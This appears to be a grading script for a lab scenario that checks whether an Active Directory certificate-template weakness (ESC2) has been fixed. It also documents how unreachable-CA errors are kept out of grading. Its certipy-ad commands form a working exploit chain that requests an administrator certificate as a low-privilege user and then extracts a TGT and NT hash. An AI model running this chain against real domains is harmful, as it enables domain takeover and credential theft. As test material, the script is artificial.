#!/usr/bin/env bash
# meta4/ad-vm/scenario-08/verify-poc.sh
# PASS (exit 0) iff alice cannot coerce an Administrator PFX via ESC2.

set -euo pipefail

cd "$(mktemp -d)"

REQ=$(timeout 60 /usr/bin/certipy-ad req \
    -u 'alice@corp.local' -p 'Password1!' \
    -ca 'corp-ca01-CA' \
    -dc-ip 10.20.30.5 \
    -template 'ESC2-AnyPurpose' \
    -upn 'administrator@corp.local' 2>&1 || true)

echo "--- certipy req output ---"
echo "$REQ"
echo "--- /certipy req ---"

# --- CA not serving RPC: HARNESS ERROR, never a verdict ---
#
# ept_s_not_registered means the endpoint mapper has no ICertRequestD
# (91AE6020-9E3C-11CF-8D7C-00AA00C091BE) to hand out: the CA's enrollment
# interface is not reachable from here, which says nothing about whether the
# Any Purpose template is still enrollable.
#
# This used to fall through to exit 1, which is wrong in BOTH directions.
# Observed on the 2026-07-26 gate run: gates 1 AND 2 both hit this, so the
# vulnerable baseline "failed for the right reason" and the remediated host
# "was still vulnerable" -- on identical output that only ever meant the CA
# was unreachable. Exit 2 keeps it out of the evidence pool entirely.
#
# Safe here because this scenario's reference remediation unpublishes a
# template and asserts the CA is STILL SERVING; taking the CA offline is never
# the intended fix, so this cannot swallow a legitimate repair.
if echo "$REQ" | grep -qiE 'ept_s_not_registered|Failed to get DCE RPC connection|Failed to get dynamic TCP endpoint'; then
    echo "[verify-poc-08] HARNESS ERROR: CA RPC enrollment interface not registered" >&2
    echo "[verify-poc-08] the CA is not serving ICertRequestD to this host -- fix the lab, not the scenario" >&2
    exit 2
fi

if [ -f administrator.pfx ]; then
    AUTH=$(timeout 60 /usr/bin/certipy-ad auth \
        -pfx administrator.pfx \
        -dc-ip 10.20.30.5 2>&1 || true)
    echo "--- certipy auth output ---"
    echo "$AUTH"
    if echo "$AUTH" | grep -qE 'NT hash|AS-REP received'; then
        echo "[verify-poc-08] ESC2 still exploitable - PFX + TGT + NT hash recovered" >&2
        exit 1
    fi
fi

if echo "$REQ" | grep -qiE 'template.*not found|access_denied|enrollment.*denied|cannot enroll'; then
    echo "[verify-poc-08] alice denied ESC2 enrollment - PoC BLOCKED"
    exit 0
fi

# If we got here with no pfx and no denial signature, treat as blocked only
# if certipy exited with an error AND no pfx. Otherwise FAIL.
if [ ! -f administrator.pfx ]; then
    echo "[verify-poc-08] no PFX and no recognised denial - INCONCLUSIVE, grading FAIL" >&2
    echo "[verify-poc-08] an inconclusive probe is not evidence of remediation" >&2
    exit 1
fi

echo "[verify-poc-08] unrecognised result - treating as FAIL" >&2
exit 1
